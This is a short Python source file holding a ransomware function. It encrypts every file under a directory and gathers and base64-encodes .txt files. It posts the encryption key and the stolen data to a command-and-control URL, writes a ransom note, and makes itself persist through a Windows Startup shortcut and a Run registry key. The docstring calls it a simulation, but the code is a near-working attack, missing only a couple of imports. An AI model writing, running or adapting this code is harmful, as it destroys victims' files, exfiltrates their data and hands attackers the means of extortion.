from cryptography.fernet import Fernet
import requests
import winreg as reg
import win32com.client

def ransomware_with_data_exfiltration(directory: str, note: str, c2_url: str) -> None:
    """
    This function simulates a ransomware attack by encrypting all files in the specified directory,
    exfiltrating sensitive data to a command and control server, displaying a ransom note, and ensuring persistence.

    :param directory: The path of the directory to encrypt.
    :param note: The ransom note to display to the victim.
    :param c2_url: The URL of the command and control server to send the encryption key and exfiltrated data.
    """
    # Generate a key for encryption
    key = Fernet.generate_key()
    cipher = Fernet(key)

    # Encrypt all files in the directory
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = cipher.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)

    # Exfiltrate sensitive data
    sensitive_files = [os.path.join(root, file) for root, _, files in os.walk(directory) for file in files if file.endswith('.txt')]
    exfiltrated_data = b''.join([open(file, 'rb').read() for file in sensitive_files])
    encoded_data = base64.b64encode(exfiltrated_data)

    # Send the encryption key and exfiltrated data to the C2 server
    payload = {
        'key': key.decode(),
        'data': encoded_data.decode()
    }
    requests.post(c2_url, json=payload)

    # Create a ransom note file
    with open(os.path.join(directory, 'README.txt'), 'w') as f:
        f.write(note)

    # Ensure persistence
    shell = win32com.client.Dispatch("WScript.Shell")
    startup_folder = shell.SpecialFolders("Startup")
    shortcut_path = os.path.join(startup_folder, "ransomware.lnk")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = os.path.abspath(__file__)
    shortcut.Save()

    # Create a registry key for persistence
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, "Ransomware", 0, reg.REG_SZ, os.path.abspath(__file__))
    reg.CloseKey(reg_key)
